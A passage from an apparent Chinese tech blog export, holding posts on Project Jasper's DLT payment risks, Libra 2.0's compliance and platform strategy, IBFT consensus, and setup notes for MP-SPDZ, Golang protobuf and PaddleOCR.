<h4 id="结算风险"><a href="#结算风险" class="headerlink" title="结算风险"></a>结算风险</h4><p>结算定义为资产不可撤销和无条件的转移。</p>
<p>与Jasper方案相关的两个方面：分布式账本更新过程的确定性，和法律确权。</p>
<p>为了确保法律的正当性，Jasper项目的结构如下：</p>
<p>DDR的转让是相当于中央银行存款基础债权的完全（不可撤销）转移。这个设计与DDR的发行有关，因此独立于Jasper平台。</p>
<p>另一方面，为确保方案最终完成，需要解决DLT基础技术相关的问题。在以太坊中，使用PoW共识机制来验证付款。但是PoW是不确定的，付款可能出现失败。在Corda平台中，理论上讲，可信公证人的角色将消除这种不确定性，交易一旦完成就无法撤销。但是，系统还没有经过压力测试，因此一些风险可能仍然与方案有关。</p>
<h4 id="运营风险"><a href="#运营风险" class="headerlink" title="运营风险"></a>运营风险</h4><p>总体评估表明，与集中式平台相比，分布式账本如果没有经过精心设计，可能会降低运营弹性。基于Corda，Jasper阶段2在满足金融市场基础设施(PFMI)方面比当前集中式系统更加昂贵。在Jasper阶段2中，参与者需要投资高可用节点以减少停机的可能性。</p>
<p>另一个关键方面是可扩展性。目前，LVTS每天处理32,000笔交易，峰值吞吐量约为每秒10笔交易。在DLT中，”分配”算法消耗了一定的时间。在像以太坊这样的PoW平台上，扩展能力有限。在第一阶段，大概是每秒14笔交易，以太坊是为公有链设计的，速度限制节点之间的信息流。虽然这个速度足以处理当前每日的LVTS，但它限制了未来的高峰量。相比之下，可扩展性不会成为Corda平台的一个限制，因为Corda没有基于固定时间的共识方法，只需要相关方的节点和公证人验证事务。</p>
<h4 id="透明性和隐私"><a href="#透明性和隐私" class="headerlink" title="透明性和隐私"></a>透明性和隐私</h4><p>大额支付系统需要参与者保持交易私密性，防止其他参与者窥视这些信息。参与者的客户也需要保持隐私。PoW系统是不适合的，因为所有交易都是公开的。</p>
<p>相比之下，基于公证的DLT系统（如Corda）则允许增加隐私，因为受信任的第三方（例如加拿大银行）有助于验证所有交易。Corda系统缺乏透明性意味着系统中没有任何节点(公证人可能除外)拥有全部信息。如果一个或多个节点的信息被破坏，则可能无法重建整个网络，因为即使公证人也没有全量的账本副本。这就需要对单个节点进行备份。这提出了在交易保持私密的限制下，DLT的运营恢复能力是否有可能的问题。</p>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>Jasper项目让我们更好地理解了DLT大额支付系统运营者，参与者和中央银行的角色和责任。在DLT框架中，运营者的角色可能更接近规则制定者或标准制定者的角色，而不是传统的IT基础架构运营商。</p>
<p>此外，Jasper项目促使大额支付系统相关者共同开发平台。私人和公共部门合作，从项目中了解了DLT技术的很多内容。他们发现这降低了相互承认所涉过程的复杂性。</p>
<p>纯粹独立的DLT大额支付系统不太可能与集中式的收益相匹配。因为上面讨论的LSM，与目前的集中式系统相比，增加的复杂性导致进一步的运营风险。</p>
<p>相反，基于DLT的大额支付系统的好处是可以与更广泛的FMI生态系统互动。例如，将其他资产与支付相结合（抵押品质押和资产出售），通过整合后端系统，扩大范围经济并降低参与者的成本。</p>
]]></content>
      <tags>
        <tag>产品设计</tag>
        <tag>paper</tag>
      </tags>
  </entry>
  <entry>
    <title>Libra2.0解读</title>
    <url>/2022/08/08/Libra2.0%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<p>Rogoff教授以新型货币“战争”来形容这次数字货币的竞争有可能改变国运，因此这是 一个严肃的问题。</p>
<p>Libra从1.0到2.0 (diem)， 协会主要从如下九个方面进行修正和回应：</p>
<ul>
<li><p>Asociation will create a comprehensive compliance program；协会将创建全面的合规计划；</p>
</li>
<li><p>Association wilset mandatory standards for unrestricted use of the Libra payment system；对于Libra（不受限制的）支付系统，协会将会设定强制性使用标准；</p>
</li>
<li><p>Association will conduc due diligence on Association Members andDesignated Dealers；协会将对协会会员和指定经销商进行尽职调查；</p>
</li>
<li><p>Association will distribute Libra Coins through regulated DesignatedDealers；协会将通过受监管的指定经销商分销Libra币；</p>
</li>
<li><p>Only regulated or Certified VASPs will be allowed to transact on the network without transaction and address balance limits；只允许受监管或认证的VASP（Virtual Asset Service Provider，数字资产服务提供商）在网络上交易，而且没有交易和余额限制（其他交易者有限制）；</p>
</li>
<li><p>Automated protocol-level compliance controls will apply for all on-chain activity；链上任何活动都会自动作合规性监；</p>
</li>
<li><p>Association will develop an off-blockchain travel rule protocol；协会将开发一个区块链外旅行规则协议（这是一个监管规则）；</p>
</li>
<li><p>Association’s FIU-function will monitor Libra network activity and coordinate with Libra network participants；协会的FIU职能将监测 Libra网络活动，并与Libra网络参与者协调；</p>
</li>
<li><p>Association will respond to identified potentially suspicious sanctioned activity，including through reporting.协会将对已查明的潜在可疑制裁活动作出回应，包括通过报告（合适的监管单位）。</p>
</li>
</ul>
<p><strong>1. 全面的合规计划</strong></p>
<p>这个计划旨在从以下几个方面满足或者超过相关法律要求和标准：</p>
<ul>
<li>指定首席合规官；</li>
<li>成立一个负责监督报告责任的委员会；</li>
<li>根据风险评估制定书面的反洗钱/反金融恐怖活动/制裁等的合规政策和程序并经协会理事会批准；</li>
<li>对所有成员，指定经销商以及受监管和认证的VASPs进行基于凤险的尽职调查；</li>
<li>根据定期的风险评估以及不断发展的合规要求，定期修订反洗钱/反金融恐怖活动/制裁合规计划；</li>
<li>建立金融情报机构(FIU-Function,Financial Intelligence Unit–Function),以便监测潜在的可疑活动；</li>
<li>指定一个类似于内部审计职能机构，对协会的反洗钱/反金融恐怖活动/制裁合规计划进行定期的独立审查；</li>
<li>进行相关的员工培训。</li>
</ul>
<p><strong>2. 组织管理</strong><br>    协会会对其会员，指定经销商，受监管或认证的VASPs对准入Libra网络设置强制性标准。<br><strong>3. 尽职调查</strong><br>    协会将对协会会员和指定经销商进行尽职调查。尽职调查包括但不限于：</p>
<ul>
<li><p>实体状态；</p>
</li>
<li><p>制裁筛选；</p>
</li>
<li><p>负面新闻；</p>
</li>
<li><p>受益所有人和控制人；</p>
</li>
<li><p>遵守适用的反洗钱/反金融恐怖活动/制裁合规要求的情况（如果有的话)；</p>
</li>
<li><p>许可证和注册；</p>
</li>
<li><p>实体位置及其客户群的地理位置。日青青那组贵食个一丝</p>
</li>
</ul>
<p><strong>4. 发币通过指定经销商</strong><br>    Libra网络将仅与指定经销商一起铸造向市场发行的Libra Coins,并且也只从这些指定经销商处兑换Libra Coins,这些指定经销商必须是受到监管的。Lbra网络和指定经销商一起铸造并销毁Libra Coins,不会和任何交易所或者终端有任何合同关系。</p>
<p><strong>5. 仅受监管或认证的VASPs可以没有交易或是余额限制</strong><br>    协会期望大多数人会通过VASPs和Libra支付系统进行交互。VASPs为了方便用户进行交易，可能会将交易记录在其内部交易账簿上而不是Libra的区块链上。受监管或认证的VASPs在使用Libra交易系统时可无交易和余额的限制。但是Unhosted Wallets(非托管钱包，协会允许的可使用Libra交易系统的非VASPs机构)会受限。<br><strong>6. 协议层级（protocol-levl)的链上活动自动合规</strong><br>    协会将会在Libra协议层级自动执行合规要求。旨在使得Libra区块链上的交易活动自动合规。比如在协议中自动阻止受制裁的区块链地址的交易。<br><strong>7. 链下旅行规则协议</strong><br>    协会将开发区块链链下协议，通过明确受监管或认证的VASPs的使用旅行规则和记录保存要求，以促进合规。<br><strong>8. FIU功能监视Libra网络活动和参与者</strong><br>    协会将设立专门机构发挥金融情报机构的职能，以保持高水平的合规。这个机构将和政府以及服务提供者合作，以发现并阻止不当的平台使用行为。</p>
<p><strong>9. 回应潜在的可疑或受制裁的活动</strong></p>
<h4 id="Libra-2-0-的宏大目标-—-平台霸权"><a href="#Libra-2-0-的宏大目标-—-平台霸权" class="headerlink" title="Libra 2.0 的宏大目标 — 平台霸权"></a><strong>Libra 2.0 的宏大目标 — 平台霸权</strong></h4><ol>
<li><strong>布局金融基建</strong></li>
</ol>
<p>Libra 2.0 提出新的支付方式、数字货币为基础的新金融基础基建有可能蔓延开来。Libra 2.0 指出协会期待与各国央行合作，参与国家数字法币的建设和运行。</p>
<ol start="2">
<li><strong>币链分离，弃币保链</strong></li>
</ol>
<p>放弃霸权币来保障霸权链的指导原则。传统数字货币，例如比特币，如果比特币平台不见了，比特币也就不复存在，就没有了价值。这是一种币链需要相互依存的设计和状态。Libra 2.0 的币和链是分离的，计划链处理多种稳定币和央行数字法币。</p>
<p>策略上，放弃在任何国家和当地法币或是将来央行数字货币竞争的机会，换取Libra 2.0 平台在这些国家使用的许可权。正如Libra2.0提出的，Libra协会会和其他国家央行合作，允许这些国家的央行数字法币在Liba平台运行（这就是保链思想)，Libra还愿意放弃自己的Libra币（这就是弃币思想），而只使用当地发行的稳定币或是央行数字法币。</p>
<p>Liba协会之所以采取该措施，是因为其重视链，认为币（数字货币）不是主要的创新，真正的突破在于链在协议层级传递价值，协会副主<br>席Dante Disparte的原文是“Blockchain,Not Crypto,Is at Core of Facebook’s Libra”。为了避免大家有不同认知，他还继续说：“加密货币不是这次创新的重要的维度，真正的突破是在协议层级传递价值，这才是Libra最大的贡献。没有区块链作为核心技术，会非常难开发一个开放钱包和开放用户(微信、支付宝)的平台”。</p>
<p>在链的设计上，Libra2.0还提出了同一链服务多种数字货币的想法。Liba2.0注重开发区块链的底层架构，追求该架构的有效性、低成本及可和多个数字货币、金融机构以及用户交互(interoperability)的能力。Disparte多次强调交互性是Libra2.0的重中之重，链的交互性也代表了平台的交互性。Disparte也批评了传统数字代币（例如比特币）不是支付平台，而是单一数字商品交易平台，因为它不能和其他系统交互。</p>
<p>非常明显，Libra2.0对交互性的追求，是为Libra平台能够做各种金融活动做准备，而不是像比特币平台一样只有单一功能。现在Lib只进行数字货币交易，但当Liba平台可以支持数字股票、衍生品以及其他数字资产交易的时候，Libra平台的价值会更加高涨。，</p>
<ol start="3">
<li><strong>避免“数字货币取代”(digital do1 arization)的可能性，追求比目鱼模型行。</strong></li>
</ol>
<p>“数字货币取代”这一说法经历了三个时间段。其最早出现在2017年，IMF(国际货币基金组织)认为数字货币会取代多国的法币，特别是在当地法币已经弱化的地方，例如津巴布韦，并且认为这是新型货币取代理论 (dolarion2.0)。以前是一个国家法币取代另外一个国家的法币在当地使用，这里是数字货币取代一个国家的法币。</p>
<p>紧接着2019年，Libra 1.0白皮书出现的时候，Libra币被认为比比特币强大得多，如果比特币可以取代一些国家的法币，Lb币有可能会取代或是弱化更多国家的法币。紧接着，出现“8·23”事件一英国前央行行长认为数字货币以后可以取代美元成为世界储备货币，美元的世界储备货币地位受到数字货币的挑战。如果连美元这种强势货币都有可能在将来被取代，世界各国法币以后都有可能受到冲击。</p>
<p>而协会为了让Libra项目能落地，则要积极避免类似的“数字货币取代”的说法，以免引起其他国家的恐慌，不想让其他国家认为Libra币有取代他国法币的企图。所以Libra2.0提到要积极和央行合作数字法币，或者帮助当地建立自己的稳定币或数字法币，并愿意放弃对应的Libra币。</p>
<p>但从另一个角度看，要帮助一个国家或地区建立自已的稳定币，给Libra平台的能力创设了无限大的想象空间，实际是想要让一个国家或地区的稳定币（甚至央行发行的数字法币）依托于它的平台。这样一来，Libra平台会拥有其他国家数字法币的交易数据，也意味着Libra平台会有该国家或地区的金融信息。在未来，拥有这些数据，本身就具有巨大的优势。</p>
<p>另外，Libra2.0追求比目鱼模型理论，即数字货币平台方具有不对称优势。平台背后的国家，相比于其他国家更有优势，比如一个国家可以通过监管的方式，部分决定平台可为与不可为的行为，平台越大，对背后的国家越有利，因为掌握了更多的数据和信息，以及拥有部分可控权。</p>
<p>Libra2.0追求比目鱼模型的体现是允许政府和监管单位监管Libra作业。比如允许美联储参与实时监测Libra链上的交易信息。这也让美联储对数字货币的运作具有更好的“洞察力”。</p>
<ol start="4">
<li><strong>改变Libra金融作业架构</strong></li>
</ol>
<p>​    4.1 批发链，而非批发币</p>
<p>​    4.2 混合经济模型 — 批发和零售均被融合进入 Libra 2.0。不是传统金融架构体系，不是传统的数字代币架构体系，也不是原英国央行的数字英镑架构体系，更不是币圈追求的DeFi金融架构体系。Libra 2.0 的混合模型可以使其快速部署。</p>
<ol start="5">
<li><strong>积极设定平台协议标准</strong></li>
</ol>
<p><img src="/2022/08/08/Libra2.0%E8%A7%A3%E8%AF%BB/2.png"></p>
]]></content>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>MP-SPDZ使用体验</title>
    <url>/2021/08/12/MP-SPDZ%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/data61/MP-SPDZ">data61/MP-SPDZ: Versatile framework for multi-party computation (github.com)</a></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1）在ubuntu环境中，安装依赖包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install automake build-essential git libboost-dev libboost-thread-dev libntl-dev libsodium-dev libssl-dev libtool m4 python3 texinfo yasm</span><br></pre></td></tr></table></figure>

<p>2）使用git下载项目源码，注意不是二进制的release文件。</p>
<p>3）在项目目录中，编译代码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -j 8 tldr</span><br></pre></td></tr></table></figure>

<p>4）试用并执行 <a href="https://github.com/data61/MP-SPDZ/blob/master/Programs/Source/tutorial.mpc">the tutorial</a> 教程，他是一个双方的、对恶意安全的教程。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  MP-SPDZ git:(master) ./compile.py tutorial</span><br><span class="line">Default bit length: 64</span><br><span class="line">Default security parameter: 40</span><br><span class="line">Compiling file /home/zhuang/Downloads/MP-SPDZ/Programs/Source/tutorial.mpc</span><br><span class="line">WARNING: Order of memory instructions not preserved, errors possible</span><br><span class="line">Writing to /home/zhuang/Downloads/MP-SPDZ/Programs/Schedules/tutorial.sch</span><br><span class="line">Writing to /home/zhuang/Downloads/MP-SPDZ/Programs/Bytecode/tutorial-0.bc</span><br><span class="line">Program requires:</span><br><span class="line">           4 integer inputs from player 0</span><br><span class="line">           4 integer inputs from player 1</span><br><span class="line">        5420 integer bits</span><br><span class="line">        2474 integer triples</span><br><span class="line">         238 virtual machine rounds</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>MPC</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang ProtoBuf笔记</title>
    <url>/2018/03/07/Golang-ProtoBuf%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="什么是protobuf"><a href="#什么是protobuf" class="headerlink" title="什么是protobuf"></a>什么是protobuf</h3><blockquote>
<p>protobuf(Google Protocol Buffers) 是一套完整的 IDL（接口描述语言），出自Google，基于 C++ 进行的实现，开发人员可以根据 ProtoBuf 的语言规范生成多种编程语言（Golang、Python、Java 等）的接口代码，本篇只讲述 Golang 的基础操作。ProtoBuf 所生成的二进制文件在存储效率上比 XML 高 3<del>10 倍，并且处理性能高 1</del>2 个数量级，这也是选择 ProtoBuf 作为序列化方案的一个重要因素之一。</p>
</blockquote>
<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><a href="https://github.com/google/protobuf">https://github.com/golang/protobuf</a></p>
<h3 id="安装protobuf"><a href="#安装protobuf" class="headerlink" title="安装protobuf"></a>安装protobuf</h3><ol>
<li>直接安装</li>
</ol>
<p>从 <a href="https://github.com/google/protobuf/releases">https://github.com/google/protobuf/releases</a> 下载最新版本。例如 Mac 机器下载 osx 版本</p>
<p>Mac 中默认的 go root 地址为 ++/usr/local/go++，将解压缩出来的 protoc 可执行文件 copy 到  /usr/local/go/bin 下。</p>
<p>执行 </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ protoc --version</span><br><span class="line"><span class="comment"># 如果正常打印 libprotoc 的版本信息就表明 protoc 安装成功</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Will:bin zhuangweiming$ protoc --version</span><br><span class="line">libprotoc 3.5.1</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>编译安装</p>
<ol>
<li>从 <a href="https://github.com/google/protobuf/releases">https://github.com/google/protobuf/releases</a> 下载最新版本，++protobuf-all-3.5.1.tar.gz++。</li>
<li>解压缩，在终端执行：tar zxvf protobuf-all-3.5.1.tar.gz</li>
<li>进入文件目录，在终端执行：cd protobuf-3.5.1/</li>
<li>执行配置，在终端执行：./configure</li>
<li>编译，在终端执行：make</li>
<li>检测编译，在终端执行：make check</li>
<li>安装 protoc，在终端执行：make install</li>
</ol>
</li>
</ol>
<p>执行 </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Will:bin zhuangweiming$ protoc --version</span><br><span class="line">libprotoc 3.5.1</span><br></pre></td></tr></table></figure>
<p>显示 libprotoc 3.5.1 则为成功。</p>
<h3 id="安装-ProtoBuf-相关的-golang-依赖库。获取-goprotobuf-提供的支持库，包含诸如编码（marshaling）、解码（unmarshaling）等功能。"><a href="#安装-ProtoBuf-相关的-golang-依赖库。获取-goprotobuf-提供的支持库，包含诸如编码（marshaling）、解码（unmarshaling）等功能。" class="headerlink" title="安装 ProtoBuf 相关的 golang 依赖库。获取 goprotobuf 提供的支持库，包含诸如编码（marshaling）、解码（unmarshaling）等功能。"></a>安装 ProtoBuf 相关的 golang 依赖库。获取 goprotobuf 提供的支持库，包含诸如编码（marshaling）、解码（unmarshaling）等功能。</h3><p>$ go get -u github.com/golang/protobuf/{protoc-gen-go,proto}</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>1.创建 protocDemo golang工程<br><img src="/2018/03/07/Golang-ProtoBuf%E7%AC%94%E8%AE%B0/1.png"></p>
<p>2.在 example 包中编写 person.proto</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">syntax &#x3D; &quot;proto3&quot;;</span><br><span class="line">package example;</span><br><span class="line"></span><br><span class="line">message person &#123;    &#x2F;&#x2F;  aa 会生成 Aa 命名的结构体</span><br><span class="line">    int32 id &#x3D; 1;</span><br><span class="line">    string name &#x3D; 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message all_person &#123;    &#x2F;&#x2F;  aa_bb 会生成 AaBb 的驼峰命名的结构体</span><br><span class="line">    repeated person Per &#x3D; 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.进入 Demo 工程的 example 目录，使用 protoc 编译 person.proto</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ protoc --go_out=. person.proto</span><br><span class="line"><span class="comment"># 就会生成 person.pb.go 文件</span></span><br></pre></td></tr></table></figure>
<p>4.在 golang 工程中使用 protobuf 进行序列化与反序列化</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/golang/protobuf/proto&quot;</span></span><br><span class="line">	<span class="string">&quot;protocDemo/example&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 为 AllPerson 填充数据</span></span><br><span class="line">	p1 := example.Person&#123;</span><br><span class="line">		Id:*proto.Int32(<span class="number">1</span>),</span><br><span class="line">		Name:*proto.String(<span class="string">&quot;xieyanke&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	p2 := example.Person&#123;</span><br><span class="line">		Id:<span class="number">2</span>,</span><br><span class="line">		Name:<span class="string">&quot;gopher&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	all_p := example.AllPerson&#123;</span><br><span class="line">		Per:[]*example.Person&#123;&amp;p1, &amp;p2&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 对数据进行序列化</span></span><br><span class="line">	data, err := proto.Marshal(&amp;all_p)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;Mashal data error:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">println</span>(data)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 对已经序列化的数据进行反序列化</span></span><br><span class="line">	<span class="keyword">var</span> target example.AllPerson</span><br><span class="line">	err = proto.Unmarshal(data, &amp;target)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;UnMashal data error:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">println</span>(target.Per[<span class="number">0</span>].Name) <span class="comment">// 打印第一个 person Name 的值进行反序列化验证</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>console 输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[26&#x2F;32]0xc4200140e0</span><br><span class="line">xieyanke</span><br></pre></td></tr></table></figure>

<p>参考链接：<br><a href="https://github.com/google/protobuf">https://github.com/google/protobuf</a></p>
]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>IBFT是什么</title>
    <url>/2022/04/08/IBFT%E6%98%AF%E4%BB%80%E4%B9%88/</url>
    <content><![CDATA[<p>Istanbul Byzantine Fault Tolerance (IBFT) is a proof-of-authority blockchain consensus protocol that ensures immediate finality. IBFT Consensus is inspired by <a href="http://pmg.csail.mit.edu/papers/osdi99.pdf">Castro-Liskov 99 PBFT paper</a>. </p>
<ul>
<li>在 IBFT 中，没有客户端向网络提交请求；这些验证者节点之一将被任意选择为提议者。这个单一的提议者在收到来自验证者池的消息后，将决定将什么添加到链中。</li>
<li>与 PBFT 相同，区块由PREPREPARE - PREPARE - COMMIT三个阶段。</li>
<li>IBFT 允许两种类型的节点：参与共识协议的验证者和验证区块但不参与共识协议的标准节点。（与tendermint相同）。</li>
<li>PBFT 中的验证器集是静态的，而 IBFT 具有动态验证器集，可以将验证器添加到集合中或从中删除。</li>
<li>IBFT 规定了 PBFT 的所谓 View-Change 消息的简化版本，不包括 PBFT 协议中包含的所谓 New-View 消息。<br>虽然 IBFT 没有明确使用检查点，但每个 IBFT 块都可以被视为 PBFT 检查点的 IBFT 等效项。</li>
</ul>
<p>采用IBFT的区块链有 Consensys Quorum 和 Besu。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>OCR和PaddleOCR项目</title>
    <url>/2020/07/23/OCR%E5%92%8CPaddleOCR%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p><a href="https://github.com/PaddlePaddle/PaddleOCR">https://github.com/PaddlePaddle/PaddleOCR</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>PaddleOCR旨在打造一套丰富、领先、且实用的OCR工具库，助力使用者训练出更好的模型，并应用落地。</p>
<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
<li>超轻量级中文OCR模型，总模型仅8.6M<ul>
<li>单模型支持中英文数字组合识别、竖排文本识别、长文本识别</li>
<li>检测模型DB（4.1M）+识别模型CRNN（4.5M）</li>
</ul>
</li>
<li>实用通用中文OCR模型</li>
<li>多种预测推理部署方案，包括服务部署和端侧部署</li>
<li>多种文本检测训练算法，EAST、DB</li>
<li>多种文本识别训练算法，Rosetta、CRNN、STAR-Net、RARE</li>
<li>可运行于Linux、Windows、MacOS等多种系统<h2 id="快速体验"><a href="#快速体验" class="headerlink" title="快速体验"></a>快速体验</h2></li>
<li>超轻量级中文OCR在线体验地址：<a href="https://www.paddlepaddle.org.cn/hub/scene/ocr">https://www.paddlepaddle.org.cn/hub/scene/ocr</a></li>
<li>移动端DEMO体验(基于EasyEdge和Paddle-Lite, 支持iOS和Android系统)：<a href="https://ai.baidu.com/easyedge/app/openSource?from=paddlelite">安装包二维码获取地址</a> <h2 id="中文OCR模型列表"><a href="#中文OCR模型列表" class="headerlink" title="中文OCR模型列表"></a>中文OCR模型列表</h2><a href="https://github.com/PaddlePaddle/PaddleOCR/blob/develop/README_cn.md">https://github.com/PaddlePaddle/PaddleOCR/blob/develop/README_cn.md</a><h2 id="快速安装"><a href="#快速安装" class="headerlink" title="快速安装"></a>快速安装</h2></li>
</ul>
<p>经测试PaddleOCR可在glibc 2.23上运行，您也可以测试其他glibc版本或安装glic 2.23<br>PaddleOCR 工作环境</p>
<ul>
<li>PaddlePaddle 1.7+</li>
<li>python3</li>
<li>glibc 2.23</li>
<li>cuDNN 7.6+ (GPU)</li>
</ul>
<p>建议使用我们提供的docker运行PaddleOCR，有关docker使用请参考<a href="https://docs.docker.com/get-started/">链接</a>。</p>
<p><em>如您希望使用 mac 或 windows直接运行预测代码，可以从第2步开始执行。</em></p>
<ol>
<li>（建议）准备docker环境。第一次使用这个镜像，会自动下载该镜像，请耐心等待。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 切换到工作目录下</span><br><span class="line">cd &#x2F;home&#x2F;Projects</span><br><span class="line"># 首次运行需创建一个docker容器，再次运行时不需要运行当前命令</span><br><span class="line"># 创建一个名字为ppocr的docker容器，并将当前目录映射到容器的&#x2F;paddle目录下</span><br><span class="line"></span><br><span class="line">如果您希望在CPU环境下使用docker，使用docker而不是nvidia-docker创建docker</span><br><span class="line">sudo docker run --name ppocr -v $PWD:&#x2F;paddle --network&#x3D;host -it hub.baidubce.com&#x2F;paddlepaddle&#x2F;paddle:latest-gpu-cuda9.0-cudnn7-dev &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">如果您的机器安装的是CUDA9，请运行以下命令创建容器</span><br><span class="line">sudo nvidia-docker run --name ppocr -v $PWD:&#x2F;paddle --network&#x3D;host -it hub.baidubce.com&#x2F;paddlepaddle&#x2F;paddle:latest-gpu-cuda9.0-cudnn7-dev &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">如果您的机器安装的是CUDA10，请运行以下命令创建容器</span><br><span class="line">sudo nvidia-docker run --name ppocr -v $PWD:&#x2F;paddle --network&#x3D;host -it hub.baidubce.com&#x2F;paddlepaddle&#x2F;paddle:latest-gpu-cuda10.0-cudnn7-dev &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">您也可以访问[DockerHub](https:&#x2F;&#x2F;hub.docker.com&#x2F;r&#x2F;paddlepaddle&#x2F;paddle&#x2F;tags&#x2F;)获取与您机器适配的镜像。</span><br><span class="line"></span><br><span class="line"># ctrl+P+Q可退出docker，重新进入docker使用如下命令</span><br><span class="line">sudo docker container exec -it ppocr &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>注意：如果docker pull过慢，可以按照如下步骤手动下载后加载docker,以cuda9 docker为例，使用cuda10 docker只需要将cuda9改为cuda10即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载CUDA9 docker的压缩文件，并解压</span><br><span class="line">wget https:&#x2F;&#x2F;paddleocr.bj.bcebos.com&#x2F;docker&#x2F;docker_pdocr_cuda9.tar.gz</span><br><span class="line"># 为减少下载时间，上传的docker image是压缩过的，需要解压使用</span><br><span class="line">tar zxf docker_pdocr_cuda9.tar.gz</span><br><span class="line"># 创建image</span><br><span class="line">docker load &lt; docker_pdocr_cuda9.tar</span><br><span class="line"># 完成上述步骤后通过docker images检查是否加载了下载的镜像</span><br><span class="line">docker images</span><br><span class="line"># 执行docker images后如果有下面的输出，即可按照按照 步骤1 创建docker环境。</span><br><span class="line">hub.baidubce.com&#x2F;paddlepaddle&#x2F;paddle   latest-gpu-cuda9.0-cudnn7-dev    f56310dcc829</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>安装PaddlePaddle Fluid v1.7</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br><span class="line"></span><br><span class="line">如果您的机器安装的是CUDA9，请运行以下命令安装</span><br><span class="line">python3 -m pip install paddlepaddle-gpu&#x3D;&#x3D;1.7.2.post97 -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line"></span><br><span class="line">如果您的机器安装的是CUDA10，请运行以下命令安装</span><br><span class="line">python3 -m pip install paddlepaddle-gpu&#x3D;&#x3D;1.7.2.post107 -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line"></span><br><span class="line">如果您的机器是CPU，请运行以下命令安装</span><br><span class="line"></span><br><span class="line">python3 -m pip install paddlepaddle&#x3D;&#x3D;1.7.2 -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line"></span><br><span class="line">更多的版本需求，请参照[安装文档](https:&#x2F;&#x2F;www.paddlepaddle.org.cn&#x2F;install&#x2F;quick)中的说明进行操作。</span><br></pre></td></tr></table></figure>
</li>
<li><p>克隆PaddleOCR repo代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">【推荐】git clone https:&#x2F;&#x2F;github.com&#x2F;PaddlePaddle&#x2F;PaddleOCR</span><br><span class="line"></span><br><span class="line">如果因为网络问题无法pull成功，也可选择使用码云上的托管：</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;gitee.com&#x2F;paddlepaddle&#x2F;PaddleOCR</span><br><span class="line"></span><br><span class="line">注：码云托管代码可能无法实时同步本github项目更新，存在3~5天延时，请优先使用推荐方式。</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装第三方库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd PaddleOCR</span><br><span class="line">pip3 install -r requirments.txt</span><br></pre></td></tr></table></figure>

</li>
</ol>
